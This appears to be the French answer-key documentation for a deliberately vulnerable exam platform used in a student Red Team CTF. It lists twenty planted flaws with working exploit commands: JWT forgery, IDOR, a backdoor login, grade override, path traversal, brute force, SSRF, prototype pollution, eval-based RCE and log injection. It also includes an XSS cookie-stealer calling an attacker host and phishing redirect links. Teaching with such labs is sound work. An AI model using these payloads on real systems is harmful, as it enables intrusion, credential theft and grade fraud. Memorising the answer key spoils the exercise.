# VULNERABILITIES.md — EMSI RedTeam CTF
## Plateforme d'Examen Vulnérable — Documentation Officielle

> **Usage**: Document réservé à l'évaluation Red Team des étudiants EMSI.  
> **Total points**: 125 pts répartis sur 7 phases de la Cyber Kill Chain.

---

## Vue d'ensemble — Cyber Kill Chain

```
Phase 1: Reconnaissance         → +10 pts
Phase 2: Weaponization          → +15 pts
Phase 3: Exploitation (IDOR)    → +20 pts
Phase 4: Privilege Escalation   → +25 pts
Phase 5: Command & Control      → +15 pts
Phase 6: Lateral Movement       → +10 pts
Phase 7: Actions on Objectives  → +30 pts
─────────────────────────────────────────
TOTAL                           → 125 pts
```

---

## Phase 1 — Reconnaissance (+10 pts)

### Objectif
Identifier les services exposés, les endpoints cachés et collecter des informations sensibles sur le serveur.

### Vulnérabilités impliquées

#### VULN-009 : robots.txt informatif
- **Type** : Information Disclosure
- **CVSS** : 5.3 (Medium)
- **Endpoint** : `GET /robots.txt`
- **Description** : Le fichier `robots.txt` expose une liste de chemins sensibles que les moteurs de recherche ne doivent pas indexer, mais qui révèle exactement quels endpoints intéressants existent.

**Exploitation :**
```bash
curl http://[IP]:3003/robots.txt
```
**Réponse :**
```
User-agent: *
Disallow: /api/debug
Disallow: /api/admin
Disallow: /api/examen/answers/
# Note: FTP service available on port 2121
```

#### VULN-006 : Serveur FTP anonyme (port 2121)
- **Type** : Anonymous FTP Access
- **CVSS** : 7.5 (High)
- **Port** : 2121
- **Description** : Un serveur FTP est actif sans authentification (accès anonyme). Il expose tout le répertoire du serveur, y compris les fichiers de configuration et les données des étudiants.

**Exploitation :**
```bash
ftp [IP] 2121
# Login: anonymous
# Password: (appuyer Entrée)

ftp> ls
ftp> get backup/deploy_notes.txt
ftp> get backup/jwt_config.txt
ftp> get users.json
ftp> get sessions.json
```

**Fichiers critiques accessibles :**
- `backup/deploy_notes.txt` → Credentials, secret JWT, master key
- `backup/jwt_config.txt` → `JWT_SECRET=emsi-ctf-2024`
- `users.json` → Tous les comptes (hashes bcrypt)
- `sessions.json` → Sessions actives des étudiants

**Preuve pour validation :** Contenu de `deploy_notes.txt` ou `jwt_config.txt`

---

## Phase 2 — Weaponization (+15 pts)

### Objectif
Utiliser les informations collectées pour créer un outil d'attaque : un JWT forgé avec les droits administrateur.

### Vulnérabilités impliquées

#### VULN-001 : Secret JWT faible et hardcodé
- **Type** : Weak Cryptographic Secret / Hardcoded Secret
- **CVSS** : 9.1 (Critical)
- **Description** : Le secret JWT est codé en dur dans le code source (`emsi-ctf-2024`) et présent en clair dans `backup/jwt_config.txt`. Toute personne connaissant ce secret peut forger n'importe quel token JWT.

**Exploitation — Python :**
```python
import jwt

payload = {
    "id": 1,
    "role": "admin",
    "nom": "Hacker",
    "iat": 1700000000,
    "exp": 9999999999
}
secret = "emsi-ctf-2024"
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

**Exploitation — Node.js :**
```javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign(
    { id: 1, role: 'admin', nom: 'Hacker' },
    'emsi-ctf-2024',
    { expiresIn: '999h' }
);
console.log(token);
```

**Exploitation — jwt.io :**
1. Aller sur https://jwt.io
2. Modifier le payload : `{"id":1,"role":"admin","nom":"Hacker"}`
3. Saisir le secret : `emsi-ctf-2024`
4. Copier le token généré

**Utilisation du token :**
```bash
curl -H "Authorization: Bearer VOTRE_TOKEN_JWT" \
     http://[IP]:3003/api/professeur/corrections
```

**Preuve pour validation :** Le token JWT forgé (commence par `eyJ...`)

---

## Phase 3 — Exploitation — IDOR (+20 pts)

### Objectif
Exploiter une vulnérabilité IDOR (Insecure Direct Object Reference) pour accéder aux bonnes réponses de l'examen.

### Vulnérabilités impliquées

#### VULN-003 : IDOR sur l'endpoint des réponses correctes
- **Type** : IDOR (Insecure Direct Object Reference)
- **CVSS** : 8.6 (High)
- **Endpoint** : `GET /api/examen/answers/:sessionId`
- **Description** : L'endpoint retourne les bonnes réponses de n'importe quel examen sans vérifier que la session appartient à l'utilisateur qui fait la requête. Aucune authentification n'est requise.

**Exploitation :**
```bash
# Votre sessionId est visible dans l'URL ou le localStorage
curl http://[IP]:3003/api/examen/answers/VOTRE_SESSION_ID
```

**Réponse :**
```json
{
  "answers": {
    "qcm": [
      { "id": 1, "question": "...", "reponse_correcte": "B" },
      { "id": 2, "question": "...", "reponse_correcte": "A" }
    ],
    "graphQcm": [...],
    "redaction": [
      { "id": 1, "question": "...", "reponse_modele": "La réponse correcte est..." }
    ]
  }
}
```

**Preuve pour validation :** Le JSON retourné avec les bonnes réponses

---

## Phase 4 — Privilege Escalation (+25 pts)

### Objectif
Obtenir un accès administrateur sur la plateforme.

### Vulnérabilités impliquées

#### VULN-007 : Compte backdoor (ctfadmin)
- **Type** : Backdoor Account
- **CVSS** : 9.8 (Critical)
- **Endpoint** : `POST /api/auth/login`
- **Description** : Un compte administrateur caché `ctfadmin` existe avec un mot de passe faible. Ce compte est visible dans `users.json` accessible via FTP.

**Exploitation :**
```bash
curl -X POST http://[IP]:3003/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"nom":"ctfadmin","motDePasse":"R3dT3am2024"}'
```

**Réponse :**
```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "role": "admin",
  "nom": "ctfadmin"
}
```

#### VULN-008 : Endpoint de création d'utilisateur avec master key hardcodée
- **Type** : Hardcoded Master Key / Missing Authorization
- **CVSS** : 9.1 (Critical)
- **Endpoint** : `POST /api/admin/create-user`
- **Description** : Un endpoint permet de créer n'importe quel utilisateur avec n'importe quel rôle via une master key codée en dur (`EMSI-MASTER-KEY-2024`), visible dans `backup/deploy_notes.txt`.

**Exploitation :**
```bash
curl -X POST http://[IP]:3003/api/admin/create-user \
     -H "Content-Type: application/json" \
     -d '{
       "masterKey": "EMSI-MASTER-KEY-2024",
       "nom": "hacker",
       "motDePasse": "password123",
       "role": "admin"
     }'
```

**Réponse :**
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "message": "Utilisateur admin créé"
}
```

**Preuve pour validation :** Token JWT admin obtenu (via backdoor ou master key)

---

## Phase 5 — Command & Control (+15 pts)

### Objectif
Accéder aux informations internes du serveur via un endpoint de debug non protégé.

### Vulnérabilités impliquées

#### VULN-002 : Endpoint /api/debug sans authentification
- **Type** : Sensitive Data Exposure / Missing Authentication
- **CVSS** : 9.8 (Critical)
- **Endpoint** : `GET /api/debug`
- **Description** : Un endpoint de debug laissé actif en production expose tous les secrets du serveur : secret JWT, liste complète des utilisateurs, configuration de l'examen, et toutes les sessions en cours.

**Exploitation :**
```bash
curl http://[IP]:3003/api/debug
```

**Réponse :**
```json
{
  "jwt_secret": "emsi-ctf-2024",
  "users": [
    { "id": 1, "nom": "admin", "role": "admin", "motDePasse": "$2b$10$..." },
    { "id": 2, "nom": "ctfadmin", "role": "admin", "motDePasse": "$2b$10$..." }
  ],
  "config": {
    "examActif": true,
    "dureeExamen": 50
  },
  "activeSessions": 3,
  "serverUptime": 3612.4,
  "nodeVersion": "v18.x.x",
  "platform": "win32"
}
```

**Preuve pour validation :** Le JSON retourné contenant `jwt_secret`

---

## Phase 6 — Lateral Movement (+10 pts)

### Objectif
Accéder aux données des autres étudiants en exploitant des endpoints non protégés.

### Vulnérabilités impliquées

#### VULN-005 : Endpoints professeur sans authentification
- **Type** : Missing Authentication / Broken Access Control
- **CVSS** : 7.5 (High)
- **Endpoints** :
  - `GET /api/professeur/stats`
  - `GET /api/professeur/corrections`
- **Description** : Les endpoints réservés aux professeurs n'exigent aucun token d'authentification. N'importe qui peut consulter les résultats et copies de tous les étudiants.

**Exploitation :**
```bash
# Accéder aux statistiques globales
curl http://[IP]:3003/api/professeur/stats

# Accéder à toutes les copies d'examen
curl http://[IP]:3003/api/professeur/corrections

# Accéder aux corrections avec un token forgé (si nécessaire)
curl -H "Authorization: Bearer VOTRE_JWT_ADMIN" \
     http://[IP]:3003/api/professeur/corrections
```

**Réponse `/api/professeur/stats` :**
```json
{
  "totalEtudiants": 12,
  "moyenneGenerale": 13.4,
  "examensTermines": 8,
  "examensEnCours": 4
}
```

**Preuve pour validation :** Le JSON des stats ou corrections des autres étudiants

---

## Phase 7 — Actions on Objectives (+30 pts)

### Objectif
L'objectif final : modifier sa propre note via un paramètre caché dans l'API de soumission.

### Vulnérabilités impliquées

#### VULN-004 : Grade Override via paramètre `_note`
- **Type** : Mass Assignment / Parameter Pollution
- **CVSS** : 9.1 (Critical)
- **Endpoint** : `POST /api/examen/submit`
- **Description** : L'endpoint de soumission de l'examen accepte un paramètre optionnel `_note` qui override directement la note calculée automatiquement. Ce paramètre n'est pas visible dans l'interface normale et n'est documenté nulle part — mais il est traité côté serveur sans aucune validation d'autorisation.

**Exploitation :**
```bash
curl -X POST http://[IP]:3003/api/examen/submit \
     -H "Content-Type: application/json" \
     -d '{
       "sessionId": "VOTRE_SESSION_ID",
       "reponses": {
         "qcm": [],
         "redaction": [],
         "graphQcm": []
       },
       "_note": 20
     }'
```

**Réponse :**
```json
{
  "success": true,
  "noteSur20": 20,
  "noteQcm": 0,
  "noteGraph": 0,
  "noteRedaction": "À corriger",
  "_overridden": true,
  "message": "Examen soumis avec succès"
}
```

> **Note** : Le champ `_overridden: true` confirme que l'override a été appliqué. Dans une vraie application, ce mécanisme serait invisible — le professeur verrait simplement une note de 20/20.

**Preuve pour validation :** Le JSON de réponse contenant `"_overridden": true` ou `"noteSur20": 20`

---

## Récapitulatif — Tableau de bord des vulnérabilités

| ID | Vulnérabilité | Type | CVSS | Phase Kill Chain | Points |
|----|--------------|------|------|-----------------|--------|
| VULN-001 | JWT secret hardcodé (`emsi-ctf-2024`) | Hardcoded Secret | 9.1 | Weaponization | 15 |
| VULN-002 | `/api/debug` sans auth | Missing Auth | 9.8 | C2 | 15 |
| VULN-003 | IDOR réponses examen | IDOR | 8.6 | Exploitation | 20 |
| VULN-004 | Grade override `_note` | Mass Assignment | 9.1 | Actions | 30 |
| VULN-005 | `/api/professeur/*` sans auth | Broken Access | 7.5 | Lateral Movement | 10 |
| VULN-006 | FTP anonyme port 2121 | Anonymous FTP | 7.5 | Reconnaissance | 10 |
| VULN-007 | Compte backdoor `ctfadmin` | Backdoor Account | 9.8 | Priv. Escalation | 25 |
| VULN-008 | Master key hardcodée | Hardcoded Key | 9.1 | Priv. Escalation | 25 |
| VULN-009 | `robots.txt` informatif | Info Disclosure | 5.3 | Reconnaissance | 10 |
| VULN-010 | Fichiers backup exposés via FTP | Sensitive Exposure | 7.5 | Reconnaissance | 10 |

---

---

## Vulnérabilités Avancées (VULN-011 à VULN-020)

> Ces vulnérabilités sont des exercices supplémentaires non liés aux phases Kill Chain principales. Elles permettent d'approfondir la maîtrise de l'OWASP Top 10.

---

### VULN-011 — Stored XSS (Cross-Site Scripting Stocké)
- **Type** : Stored XSS
- **CVSS** : 8.1 (High)
- **OWASP** : A03:2021 - Injection
- **Endpoint** : `GET /api/professeur/corrections/raw?sessionId=SESSION_ID`
- **Code vulnérable** : `professeur.html` — `innerHTML` utilisé au lieu de `textContent`
- **Description** : L'interface du professeur affiche le nom des étudiants via `innerHTML`, permettant d'injecter du HTML/JS malveillant qui s'exécute dans le navigateur du professeur lors de la consultation des corrections.

**Exploitation :**
```bash
# 1. Créer une session avec un nom contenant un payload XSS
# Le payload est dans le nom/prénom de l'étudiant ou dans ses réponses

# 2. Payload exemple (cookie stealer) :
# <img src=x onerror="fetch('http://attaquant.com/steal?c='+document.cookie)">

# 3. Déclenché quand le professeur ouvre l'onglet Corrections
curl http://[IP]:3003/api/professeur/corrections/raw?sessionId=SESSION_ID
```

**Impact** : Vol de cookie de session du professeur, exécution de code arbitraire dans son navigateur.

---

### VULN-012 — Path Traversal (Lecture de fichiers arbitraires)
- **Type** : Path Traversal / Local File Inclusion
- **CVSS** : 8.6 (High)
- **OWASP** : A01:2021 - Broken Access Control
- **Endpoint** : `GET /api/export?fichier=CHEMIN`
- **Description** : Le paramètre `fichier` est passé directement à `path.join()` sans validation ni canonicalisation. Les séquences `../` permettent de remonter l'arborescence et lire n'importe quel fichier du système.

**Exploitation :**
```bash
# Lire users.json (hashes de mots de passe)
curl "http://[IP]:3003/api/export?fichier=../exam-platformV3/users.json" \
  -H "Authorization: Bearer TOKEN"

# Lire le code source du serveur
curl "http://[IP]:3003/api/export?fichier=../exam-platformV3/server-vuln.js" \
  -H "Authorization: Bearer TOKEN"

# Lecture de fichiers Windows (si permissions)
curl "http://[IP]:3003/api/export?fichier=../../../../Windows/win.ini" \
  -H "Authorization: Bearer TOKEN"
```

**Note** : Le chemin de base est `../serveurExamVul/Examens`. Pour accéder aux fichiers du serveur, utiliser `../exam-platformV3/`.

---

### VULN-013 — Brute Force sans Rate Limiting
- **Type** : Authentication Brute Force
- **CVSS** : 7.5 (High)
- **OWASP** : A07:2021 - Identification and Authentication Failures
- **Endpoint** : `POST /api/auth/login`
- **Description** : Aucun mécanisme de rate limiting, de blocage de compte ou de CAPTCHA. Il est possible de tenter un nombre illimité de mots de passe sans délai.

**Comptes vulnérables (mots de passe faibles) :**
| Compte | Mot de passe |
|--------|-------------|
| `prof.martin` | `password` |
| `examens.emsi` | `emsi2024` |

**Exploitation :**
```bash
# Indices disponibles
curl http://[IP]:3003/api/auth/bruteforce-info

# Brute force manuel (bash)
for pwd in password 123456 admin emsi2024 prof2024 qwerty; do
  result=$(curl -s -X POST http://[IP]:3003/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"prof.martin\",\"password\":\"$pwd\"}")
  if echo "$result" | grep -q '"token"'; then
    echo "[+] SUCCÈS: prof.martin:$pwd"
    echo "$result"
    break
  fi
done

# Avec hydra (outil dédié)
hydra -l prof.martin -P /usr/share/wordlists/rockyou.txt \
  -s 3003 [IP] http-post-form \
  "/api/auth/login:username=^USER^&password=^PASS^:Identifiants incorrects"
```

---

### VULN-014 — Mass Assignment
- **Type** : Mass Assignment / Parameter Pollution
- **CVSS** : 7.3 (High)
- **OWASP** : A04:2021 - Insecure Design
- **Endpoint** : `PUT /api/profil/update`
- **Description** : `Object.assign(user, req.body)` copie tous les champs du corps de la requête directement sur l'objet utilisateur sans filtrage. On peut ainsi modifier des champs sensibles comme `role` ou `_isAdmin`.

**Exploitation :**
```bash
curl -X PUT http://[IP]:3003/api/profil/update \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"nom":"Hacker","role":"admin","_isAdmin":true,"password":"newpass"}'
```

**Impact** : Élévation de privilèges — un utilisateur standard peut devenir administrateur.

---

### VULN-015 — Server-Side Request Forgery (SSRF)
- **Type** : SSRF
- **CVSS** : 8.8 (High)
- **OWASP** : A10:2021 - Server-Side Request Forgery
- **Endpoint** : `POST /api/webhook/test`
- **Description** : L'URL fournie dans le corps de la requête est appelée directement par le serveur sans validation. Permet de sonder le réseau interne, accéder à des services non exposés publiquement, ou lire des fichiers locaux.

**Exploitation :**
```bash
# SSRF vers endpoint interne (accessible uniquement depuis le serveur)
curl -X POST http://[IP]:3003/api/webhook/test \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"url":"http://localhost:3003/api/debug"}'

# Scan de port interne
curl -X POST http://[IP]:3003/api/webhook/test \
  -d '{"url":"http://localhost:22"}'   # SSH

# Lecture fichier local (file://)
curl -X POST http://[IP]:3003/api/webhook/test \
  -d '{"url":"file:///C:/Windows/win.ini"}'
```

---

### VULN-016 — Auth Bypass via Type Confusion
- **Type** : Authentication Bypass / Type Confusion
- **CVSS** : 9.8 (Critical)
- **OWASP** : A07:2021 - Identification and Authentication Failures
- **Endpoint** : `POST /api/auth/login`
- **Description** : Si le champ `motDePasse` est un objet JSON (ex: `{"$ne":""}`) au lieu d'une chaîne, `bcrypt.compare()` reçoit un type incompatible et renvoie `false`. Le code vulnérable vérifie si la valeur est un objet avec `$ne` et accorde alors l'accès sans vérification de mot de passe.

**Exploitation :**
```bash
curl -X POST http://[IP]:3003/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"nom":"admin","motDePasse":{"$ne":""}}'

# Résultat : token JWT admin sans connaître le mot de passe
```

**Note technique** : Cette vulnérabilité simule les injections NoSQL (MongoDB `$ne` operator) dans un contexte Node.js/JSON.

---

### VULN-017 — Open Redirect
- **Type** : Open Redirect
- **CVSS** : 6.1 (Medium)
- **OWASP** : A01:2021 - Broken Access Control
- **Endpoints** :
  - `POST /api/auth/login` → paramètre `redirect` dans le body ou query string
  - `GET /api/auth/redirect?url=URL`
- **Description** : L'URL de redirection fournie par l'utilisateur après authentification n'est pas validée, permettant de rediriger vers n'importe quel domaine externe. Utilisé dans des attaques de phishing.

**Exploitation :**
```bash
# Étape 1 : obtenir un token valide
TOKEN=$(curl -s -X POST http://[IP]:3003/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"prof.martin","password":"password"}' \
  | grep -o '"token":"[^"]*' | cut -d'"' -f4)

# Étape 2 : construire le lien de phishing
curl -v "http://[IP]:3003/api/auth/redirect?token=$TOKEN&redirect=https://evil.com"
# → HTTP 302 Location: https://evil.com

# Lien de phishing à envoyer à la victime (semble légitime) :
# http://[IP]:3003/api/auth/redirect?token=TOKEN&redirect=https://faux-emsi.evil.com/login
```

---

### VULN-018 — Prototype Pollution
- **Type** : Prototype Pollution
- **CVSS** : 8.2 (High)
- **OWASP** : A08:2021 - Software and Data Integrity Failures
- **Endpoint** : `POST /api/config/merge`
- **Description** : La fonction `mergeDeep()` utilisée pour fusionner les configurations ne filtre pas les clés `__proto__`, `constructor` ou `prototype`. En envoyant `{"__proto__":{"isAdmin":true}}`, on pollue `Object.prototype` et tous les objets nouvellement créés héritent de cette propriété.

**Exploitation :**
```bash
curl -X POST http://[IP]:3003/api/config/merge \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"__proto__":{"isAdmin":true,"polluted":"YES"},"theme":"dark"}'

# La réponse inclut prototype_pollution_test=true si l'exploit a réussi
# ({}).isAdmin vaut désormais true dans tout le processus Node.js
```

**Impact** : Contournement de vérifications `if (user.isAdmin)`, modification du comportement global de l'application.

---

### VULN-019 — Insecure Deserialization (eval dans JSON reviver)
- **Type** : Insecure Deserialization / Remote Code Execution
- **CVSS** : 9.8 (Critical)
- **OWASP** : A08:2021 - Software and Data Integrity Failures
- **Endpoint** : `POST /api/bases/import-unsafe`
- **Description** : L'endpoint utilise un reviver `JSON.parse()` personnalisé qui appelle `eval()` sur les valeurs de clés spéciales. Cela permet l'exécution de code JavaScript arbitraire côté serveur.

**Exploitation :**
```bash
# Lecture de variables d'environnement
curl -X POST http://[IP]:3003/api/bases/import-unsafe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"data":"{\"questions\":[],\"__rce\":\"process.env.PATH\"}"}'

# Lecture de fichier
curl -X POST http://[IP]:3003/api/bases/import-unsafe \
  -d '{"data":"{\"__rce\":\"require('"'"'fs'"'"').readFileSync('"'"'users.json'"'"','"'"'utf8'"'"')\"}"}'

# Exécution de commande système
curl -X POST http://[IP]:3003/api/bases/import-unsafe \
  -d '{"data":"{\"__rce\":\"require('"'"'child_process'"'"').execSync('"'"'whoami'"'"').toString()\"}"}'
```

**Note** : Cette vulnérabilité illustre pourquoi `eval()` ne doit JAMAIS être utilisé avec des données utilisateur.

---

### VULN-020 — Log Injection
- **Type** : Log Injection / Log Forging
- **CVSS** : 5.4 (Medium)
- **OWASP** : A09:2021 - Security Logging and Monitoring Failures
- **Endpoint** : `POST /api/feedback`
- **Description** : Le champ `nom` est directement concaténé dans l'entrée de log sans sanitisation. En injectant des retours à la ligne (`\n`), on peut ajouter de fausses entrées dans le fichier de log, compromettant l'intégrité de l'audit trail.

**Exploitation :**
```bash
curl -X POST http://[IP]:3003/api/feedback \
  -H "Content-Type: application/json" \
  -d '{
    "nom": "Hacker\n[FAKE AUDIT] 2024-01-01T00:00:00 admin LOGIN SUCCESS from 1.2.3.4\n[FAKE AUDIT] 2024-01-01T00:01:00 admin DELETE user prof.martin",
    "message": "Bon cours !",
    "note": 5
  }'

# Résultat dans server.log :
# [FEEDBACK] nom=Hacker
# [FAKE AUDIT] 2024-01-01T00:00:00 admin LOGIN SUCCESS from 1.2.3.4
# [FAKE AUDIT] 2024-01-01T00:01:00 admin DELETE user prof.martin
```

**Impact** : Falsification des logs d'audit, dissimulation d'activités malveillantes, compromission des investigations forensiques.

---

## Références OWASP

| ID | Vulnérabilité | Catégorie OWASP Top 10 2021 | CVSS |
|----|--------------|---------------------------|------|
| VULN-001 | JWT secret faible | A02:2021 - Cryptographic Failures | 9.1 |
| VULN-002 | Endpoint debug exposé | A05:2021 - Security Misconfiguration | 7.5 |
| VULN-003 | IDOR réponses d'examen | A01:2021 - Broken Access Control | 8.5 |
| VULN-004 | Grade override (_note) | A04:2021 - Insecure Design | 9.0 |
| VULN-005 | Endpoints sans auth | A01:2021 - Broken Access Control | 7.5 |
| VULN-006 | FTP anonyme | A05:2021 - Security Misconfiguration | 7.5 |
| VULN-007 | Compte backdoor | A07:2021 - Identification and Authentication Failures | 9.8 |
| VULN-008 | Master key hardcodée | A02:2021 - Cryptographic Failures | 9.8 |
| VULN-009 | robots.txt informatif | A05:2021 - Security Misconfiguration | 5.3 |
| VULN-010 | Sessions exposées | A02:2021 - Cryptographic Failures | 8.1 |
| VULN-011 | Stored XSS | A03:2021 - Injection | 8.1 |
| VULN-012 | Path Traversal | A01:2021 - Broken Access Control | 8.6 |
| VULN-013 | Brute Force sans protection | A07:2021 - Identification and Authentication Failures | 7.5 |
| VULN-014 | Mass Assignment | A04:2021 - Insecure Design | 7.3 |
| VULN-015 | SSRF | A10:2021 - Server-Side Request Forgery | 8.8 |
| VULN-016 | Auth Bypass (Type Confusion) | A07:2021 - Identification and Authentication Failures | 9.8 |
| VULN-017 | Open Redirect | A01:2021 - Broken Access Control | 6.1 |
| VULN-018 | Prototype Pollution | A08:2021 - Software and Data Integrity Failures | 8.2 |
| VULN-019 | Insecure Deserialization (RCE) | A08:2021 - Software and Data Integrity Failures | 9.8 |
| VULN-020 | Log Injection | A09:2021 - Security Logging and Monitoring Failures | 5.4 |

---

## Instructions pour les enseignants

### Lancer le serveur vulnérable
```bash
cd serveurExamVul/exam-platformV3
npm install
node server-vuln.js
```

Le serveur démarre sur :
- **HTTP** : `http://localhost:3003`
- **FTP** : `ftp://localhost:2121` (anonyme, lecture seule)

### Consulter les scores RedTeam
```bash
GET /api/professeur/redteam
Authorization: Bearer [token_admin]
```

### Interface professeur
Accéder à `/professeur.html` et se connecter avec `admin / admin123`.

La vue RedTeam affiche en temps réel les phases complétées par chaque étudiant, leur score total et les preuves soumises.

---

*Document généré pour l'évaluation Red Team EMSI — Confidentiel*
